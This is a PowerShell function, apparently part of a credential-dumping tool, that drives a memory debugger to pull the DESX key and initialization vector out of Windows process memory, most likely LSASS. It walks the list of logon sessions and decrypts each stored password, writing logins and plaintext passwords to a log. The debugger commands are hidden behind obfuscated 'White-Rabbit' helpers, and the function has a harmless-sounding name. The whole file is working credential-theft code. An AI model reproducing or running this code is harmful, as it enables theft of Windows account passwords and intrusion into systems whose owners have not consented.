function Get-ObsoleteSystemsInformations ($buffer, $fullScriptPath) {   

    if($mode -eq 3) {
        $chain15 = White-Rabbit2
        $chain =  White-RabbitObs1  
        $chain42 = White-Rabbit42
        Write-InFile $buffer $chain         
        $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath   
        $arrayFirstAddress = ($tab -split ' ')    
        $fi = [array]::indexof($arrayFirstAddress,$chain42) + 4
        $firstAddress1 = $arrayFirstAddress[$fi]    
        $fi = [array]::indexof($arrayFirstAddress,$chain42) + 5
        $firstAddress2 = $arrayFirstAddress[$fi]    
        $firstAddress = "$firstAddress2$firstAddress1"         
        $int = 96
        $slashC = "/c"
        $chain = "$chain15 $slashC $int $firstAddress L48"      
        Write-InFile $buffer $chain         
        $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath                                 
        $arrayDesXAddressAddress = ($tab -split ' ')                              
        $passAddress1 = ""
        $j = 0
        $start = 7
        $keyAddress = ""
        while($j -le 71) {
            if($j -eq 0) {
                $value = $start
                $comma = ""
            }
            else {        
                $value++
                $comma = " "                
            }            
            $fi = [array]::indexof($arrayDesXAddressAddress,"dw") + $value                        
            $keyAddress2 = $arrayDesXAddressAddress[$fi].Substring(0,2)                      
            $keyAddress1 = $arrayDesXAddressAddress[$fi].Substring(2,2)                                  
            $keyAddress += "$keyAddress1$keyAddress2"
            $j++
        }                 
        $DESXKeyHex = $keyAddress     
        $feed = White-RabbitPi                 
        Write-InFile $buffer $feed        
        $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath                                                                                                                                      
        $array = ($tab -split ' ')    

        $j = 0
        $initializationVectorAddress = ""
        $start = 4
        while($j -le 7) {
            if($j -eq 0) {
                $value = $start
                $comma = ""
            }
            else {        
                $value++
                $comma = ", "        
            }
            $chain = White-RabbitCO
            $fi = [array]::indexof($array,$chain) + $value   
            if($j -eq 7) {
                $ia1 = $array[$fi].Substring(0,2)
            }
            else {
                $ia1 = $array[$fi]
            }
            $iva += "$ia1"
            $j++
        }   

        $g_Feedback = $iva        
        
        $Encoding = [System.Text.Encoding]::GetEncoding("windows-1252")

        $hexarray = $g_Feedback -split '(.{2})' | ? {$_}
        $hexcount = $hexarray.count
        $loopcount = 0
        $g_Feedback = ""
        while ($loopcount -le $hexcount -1) {
            $currenthex = $hexarray[$loopcount]          
            $dec = [Convert]::ToInt32($currenthex,16)    
            $String = $Encoding.GetString($dec)
            $conversion = [Char][Convert]::ToInt32($currenthex,16)    
            $g_Feedback = $g_Feedback + $String
            $loopcount = $loopcount + 1
        }        
        $hexarray = $DESXKeyHex -split '(.{2})' | ? {$_}
        $hexcount = $hexarray.count
        $loopcount = 0
        $DESXKeyHex = ""
        while ($loopcount -le $hexcount -1) {
            $currenthex = $hexarray[$loopcount]          
            $dec = [Convert]::ToInt32($currenthex,16)    
            $String = $Encoding.GetString($dec)
            $conversion = [Char][Convert]::ToInt32($currenthex,16)    
            $DESXKeyHex = $DESXKeyHex + $String
            $loopcount = $loopcount + 1
        }

        $chain = White-RabbitOrWhat   
        Write-InFile $buffer $chain         
        $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath                     

        $firstAddress = ""
        $arrayFirstAddress = ($tab -split ' ')    
        $fi = [array]::indexof($arrayFirstAddress,$chain42) + 4
        $firstAddress1 = $arrayFirstAddress[$fi]
        $fi = [array]::indexof($arrayFirstAddress,$chain42) + 5
        $firstAddress2 = $arrayFirstAddress[$fi]    
        $firstAddress = "$firstAddress2$firstAddress1"         
        $firstAddressList = $firstAddress
        $nextEntry = ""
        $i = 0
        while ($firstAddressList -ne $nextEntry) {
            if($i -eq 0) {
                $nextEntry = $firstAddress                
                $command = "$chain42 $firstAddress"  
            }
            else {                 
                $command = "$chain42 $nextEntry"    
            }
                           
            Write-InFile $buffer $command         
            $ddSecond = Call-MemoryWalker $memoryWalker $file $fullScriptPath 

            if($i -eq 0) {
                $firstAddress = $firstAddress               
                $arrayNextEntryAddress = ($ddSecond -split ' ')    
                $fi = [array]::indexof($arrayNextEntryAddress,$chain42) + 4
                $nextEntry1 = $arrayNextEntryAddress[$fi]     
                $fi = [array]::indexof($arrayNextEntryAddress,$chain42) + 5
                $nextEntry2 = $arrayNextEntryAddress[$fi]    
                $nextEntry = "$nextEntry2$nextEntry1"                   
            }
            else {        
                $firstAddress = $nextEntry
                $arrayNextEntryAddress = ($ddSecond -split ' ')    
                $fi = [array]::indexof($arrayNextEntryAddress,$chain42) + 4
                $nextEntry1 = $arrayNextEntryAddress[$fi]     
                $fi = [array]::indexof($arrayNextEntryAddress,$chain42) + 5
                $nextEntry2 = $arrayNextEntryAddress[$fi]    
                $nextEntry = "$nextEntry2$nextEntry1"                
            }    

            Write-Progress -Activity "Getting valuable informations" -status "Running..." -id 1       
            $tab = ($ddSecond -split ' ')           
            $start = 28                     
            $fi = [array]::indexof($tab,$chain42) + $start
            $la1 = $tab[$fi]             
            $la = "$la1"                            
            $ok = White-RabbitOK
            if($la -eq "00000000"){
                $start = 16                     
                $fi = [array]::indexof($tab,$chain42) + $start
                $la1 = $tab[$fi]             
                $la = "$la1"    
                
                $laCommand = "$ok $la"                  
                [io.file]::WriteAllText($buffer, $laCommand) | Out-Null
                $lDB = &$memoryWalker -z $file -c "`$`$<$fullScriptPath;Q"

                $arraylDBAddress = ($lDB -split ' ')            
                $fi = [array]::indexof($arraylDBAddress,"du") + 4
                $lPT1 = $arraylDBAddress[$fi]
                $lPT = $lPT1
            }
            else {                
                $chain = "du $la"   
                Write-InFile $buffer $chain         
                $lDB = Call-MemoryWalker $memoryWalker $file $fullScriptPath               
                                
                $arraylDBAddress = ($lDB -split ' ')            
                $fi = [array]::indexof($arraylDBAddress,"du") + 4
                $lPT1 = $arraylDBAddress[$fi]
                $lPT = $lPT1
            }     

            Write-Progress -Activity "Getting valuable informations" -status "Running..." -id 1       
            $arrayPasswordAddress = ($ddSecond -split ' ')                            
            $fi = [array]::indexof($arrayPasswordAddress,$chain42) + 19
            $lengthPassword = $arrayPasswordAddress[$fi]
            $lengthPassword = $lengthPassword.Substring(6,2)        
            $numberBytes = [int][Math]::Ceiling([System.Convert]::ToInt32($lengthPassword,16)/8) * 4                
            $fi = [array]::indexof($arrayPasswordAddress,$chain42) + 22
            $secondAddress1 = $arrayPasswordAddress[$fi]                
            $secondAddress = "$secondAddress1"   
            
            $chain = "$chain15 $secondAddress"                 
            Write-InFile $buffer $chain         
            $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath                
                   
            $arrayPasAddress = ($tab -split ' ')                  
            $passAddress1 = ""
            $passAddress2 = ""
            $j = 1
            $modJ = $j
            $begin = 4
            $stringPasswordHex = ""
            while($j -le $numberBytes -and $j -le 64) {        
                if($j -eq 1) {
                    $value = $begin
                    $comma = ""
                }
                else {
                    $goNextLine = $modJ%9            
                    if($goNextLine -eq 0) {
                        $value = $value+3
                        $comma = ", "
                        $modJ++
                    }
                    else {
                        $value++
                        $comma = ", "
                    }
                }
                $fi = [array]::indexof($arrayPasAddress,"$chain15") + $value                
                $passAddress2 = $arrayPasAddress[$fi].Substring(0,2)
                $passAddress1 = $arrayPasAddress[$fi].Substring(2,2)            
                $stringPasswordHex += "$passAddress1$passAddress2"
                $j++
                $modJ++
            }        

            $passwordHex = $stringPasswordHex                            
            Write-Log -streamWriter $global:streamWriter -infoToLog "Login : $lPT"                        
            $cipherToDecrypt = $passwordHex                      
            $hexarray = $cipherToDecrypt -split '(.{2})' | ? {$_}
            if($hexarray){
                $hexcount = $hexarray.count
                $loopcount = 0
                $cipherToDecrypt = ""
                while ($loopcount -le $hexcount -1) {
                    $currenthex = $hexarray[$loopcount]          
                    $dec = [Convert]::ToInt32($currenthex,16)    
                    $String = $Encoding.GetString($dec)
                    $conversion = [Char][Convert]::ToInt32($currenthex,16)    
                    $cipherToDecrypt = $cipherToDecrypt + $String
                    $loopcount = $loopcount + 1
                }
            
                $passwordDec = Get-OldDec $DESXKeyHex $g_Feedback $cipherToDecrypt
                $passwordDecSplitted = $passwordDec -split " "
                $passwordDecSplitted = $passwordDecSplitted -replace " ",""
                $password = ""
                foreach($letter in $passwordDecSplitted){
                    if([int]$letter -lt 98182){
                        $password = $password + [char][int]$letter
                    }
                }            
                        
                Write-Log -streamWriter $global:streamWriter -infoToLog "Password : $password"
            }
            $i++
        }        
    }
}